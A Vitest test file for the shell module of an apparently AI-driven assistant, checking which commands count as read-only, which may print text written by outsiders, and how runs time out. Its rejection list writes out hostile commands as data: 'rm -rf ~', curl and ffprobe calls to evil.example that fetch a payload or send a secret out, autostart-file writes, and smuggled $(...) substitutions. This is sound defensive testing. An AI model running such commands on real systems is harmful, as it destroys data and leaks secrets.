import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  clip,
  isReadOnlyCommand,
  mayPrintOutsideText,
  parseSimpleCommandLine,
  runCommand,
} from "../src/core/shell.ts";

describe("isReadOnlyCommand", () => {
  it.each([
    "ls -la ~/Videos",
    "pacman -Qi kdenlive",
    "pacman -Ss video editor",
    "flatpak search kdenlive",
    "df -h | head -3",
    "which ffmpeg && ffmpeg --version",
    'find ~/Videos -name "*.mp4"',
    "ffprobe clip.mp4",
    "cat notes.txt | sort | uniq",
    "tail -n 20 notes.txt",
    "ffprobe -v error -show_format clip.mp4",
    "ps aux | grep kdenlive",
    "nvidia-smi --query-gpu=memory.used --format=csv",
    "systemctl status --user pipewire",
    "cat 'my notes.txt' | wc -l",
    "kdenlive --version",
    "which kdenlive 2>/dev/null; pacman -Qi kdenlive 2>/dev/null | head -5",
    "pacman -Qi vlc >/dev/null 2>&1 && echo yes",
    "test -f ~/Videos/final.mp4",
    "test -d renders && ls renders",
  ])("%s only looks", (command) => {
    expect(isReadOnlyCommand(command)).toBe(true);
  });

  it.each([
    "",
    "rm notes.txt",
    "pacman -S vlc",
    "pkexec pacman -S vlc",
    "sudo ls",
    "flatpak install flathub org.kde.kdenlive",
    "ls > out.txt",
    "ls 2> errors.txt",
    "echo hi > /dev/nullx",
    "cat < in.txt",
    "ls; rm -rf ~",
    "ls && touch x",
    "ls | xargs rm",
    "find . -name x -delete",
    "find . -exec rm {} +",
    "sort -o out.txt in.txt",
    "uniq in.txt out.txt",
    "git push",
    "ls &",
    "ls\nrm x",
    "FOO=1 ls",
    "bash -c ls",
    "python3 script.py",
    // Found in review: each of these once slipped past a pattern match on the raw text.
    "find . -maxdepth 0 -\\exec sh -c 'curl -so x https://evil.example/p' sh '{}' +",
    "find . '-exec' rm '{}' +",
    'find . -e""xec rm {} +',
    "find . -fprint0 /tmp/x",
    "find . -name x '-delete'",
    "sort -o/home/a/.config/autostart/x.desktop payload.txt",
    "sort -uo out.txt in.txt",
    "sort --out=out.txt in.txt",
    "sort payload.txt",
    "echo hi >&2file",
    "cat payload.txt >&2/../../.config/autostart/evil.desktop",
    "git status",
    "git diff --output=/tmp/x",
    "nvidia-smi -f /tmp/x",
    "nvidia-smi --filename=/tmp/x",
    "ps auxeww",
    "ps e",
    "ffprobe http://evil.example/?d=secret",
    "mediainfo https://evil.example/x",
    "mediainfo --LogFile=/tmp/x clip.mp4",
    "tail -f /var/log/syslog",
    "date -s tomorrow",
    "file -C -m magic",
    "vim -V",
    "./planted --version",
    "/home/a/bin/tool --help",
    "systemctl status -H attacker@host",
    "pacman -Fy",
    "pacman -Sy",
    "pacman -Syu",
    "ls ~root",
    "cat <(ls)",
    "echo $(id)",
    "ls `pwd`",
    "ls |",
    "ls 'unterminated",
    // Found in the second review.
    "printf -v 'a[$(echo pwned >&2)]' x",
    "printf -v PATH %s .; ls",
    "rpm -qp https://evil.example/data",
    "ls https://evil.example/",
    "systemctl show --user",
    "free -s 1",
    // Found in the fourth review, in a rule added the same evening: bash's test works
    // out what is inside the brackets, which runs the command there.
    "test -v 'a[$(echo pwned >&2)]'",
    "test -R 'a[$(echo pwned >&2)]'",
    "test -f 'a[$(id)]'",
    "test -n word",
    "test 1 -eq 1",
    "test -f a.txt -a -v 'a[$(id)]'",
    "test -f",
  ])("%s might change something", (command) => {
    expect(isReadOnlyCommand(command)).toBe(false);
  });
});

describe("parseSimpleCommandLine", () => {
  it("splits words the way the shell does", () => {
    expect(
      parseSimpleCommandLine(`grep -r "two words" 'it''s' a\\ b | head -3 && echo ok`)?.commands,
    ).toEqual([
      ["grep", "-r", "two words", "its", "a b"],
      ["head", "-3"],
      ["echo", "ok"],
    ]);
  });

  it("drops redirections that only discard output", () => {
    expect(
      parseSimpleCommandLine("pacman -Qi vlc >/dev/null 2>&1; ls &>/dev/null")?.commands,
    ).toEqual([["pacman", "-Qi", "vlc"], ["ls"]]);
  });

  it("gives up on anything it does not model", () => {
    for (const line of [
      "ls > out",
      "ls $HOME",
      "ls *.txt",
      "a & b",
      "echo {a,b}",
      "x=1 y",
      "ls # hi",
      "",
    ]) {
      const parsed = parseSimpleCommandLine(line);
      // "x=1 y" parses as words; it is the rule table, not the splitter, that rejects it.
      if (line === "x=1 y") expect(parsed).not.toBeNull();
      else expect(parsed, line).toBeNull();
    }
  });
});

describe("mayPrintOutsideText", () => {
  it("is false only for commands that report facts about this system", () => {
    for (const command of [
      "pacman -Q kdenlive",
      "pacman -Qq",
      "systemctl --user is-active pipewire",
      "df -h",
      "which ffmpeg && ffmpeg --version",
      "uname -a",
    ]) {
      expect(mayPrintOutsideText(command), command).toBe(false);
    }
    for (const command of [
      // Descriptions, changelogs, unit files and command lines are written by other people.
      "pacman -Qi kdenlive",
      "pacman -Ss video editor",
      "paru -Gp some-package",
      "flatpak search kdenlive",
      "systemctl cat sshd",
      "systemctl status pipewire",
      "pgrep -a firefox",
      "cat page.html",
      "ls ~/Downloads",
      "grep -r todo .",
      "ffprobe clip.mp4",
      "curl x",
      "ls $HOME",
    ]) {
      expect(mayPrintOutsideText(command), command).toBe(true);
    }
  });
});

describe("runCommand", () => {
  it("returns output and the exit code", async () => {
    const ok = await runCommand("echo hello && echo oops >&2", { cwd: tmpdir(), timeoutMs: 5000 });
    expect(ok).toMatchObject({ exitCode: 0, timedOut: false });
    expect(ok.output).toContain("hello");
    expect(ok.output).toContain("oops");
    expect((await runCommand("exit 3", { cwd: tmpdir(), timeoutMs: 5000 })).exitCode).toBe(3);
  });

  it("runs in the given folder", async () => {
    const dir = await mkdtemp(join(tmpdir(), "aichan-shell-"));
    try {
      expect((await runCommand("pwd", { cwd: dir, timeoutMs: 5000 })).output).toBe(dir);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("stops a command that runs too long, children included", async () => {
    const started = Date.now();
    const result = await runCommand("sleep 30 | sleep 30", { cwd: tmpdir(), timeoutMs: 300 });
    expect(result.timedOut).toBe(true);
    expect(Date.now() - started).toBeLessThan(5000);
  });

  it("does not start at all when the user has already interrupted", async () => {
    const controller = new AbortController();
    controller.abort();
    const started = Date.now();
    const result = await runCommand("sleep 30", {
      cwd: tmpdir(),
      timeoutMs: 60_000,
      signal: controller.signal,
    });
    expect(result.exitCode).toBeNull();
    expect(Date.now() - started).toBeLessThan(1000);
  });

  it("stops when the user interrupts", async () => {
    const controller = new AbortController();
    setTimeout(() => controller.abort(), 200);
    const started = Date.now();
    await runCommand("sleep 30", { cwd: tmpdir(), timeoutMs: 60_000, signal: controller.signal });
    expect(Date.now() - started).toBeLessThan(5000);
  });
});

describe("clip", () => {
  it("keeps short text and trims the middle of long text", () => {
    expect(clip("short", 100)).toBe("short");
    const long = `${"a".repeat(500)}MIDDLE${"z".repeat(500)}`;
    const clipped = clip(long, 100);
    expect(clipped.startsWith("aaaa")).toBe(true);
    expect(clipped.endsWith("zzzz")).toBe(true);
    expect(clipped).not.toContain("MIDDLE");
    expect(clipped).toContain("characters left out");
  });
});
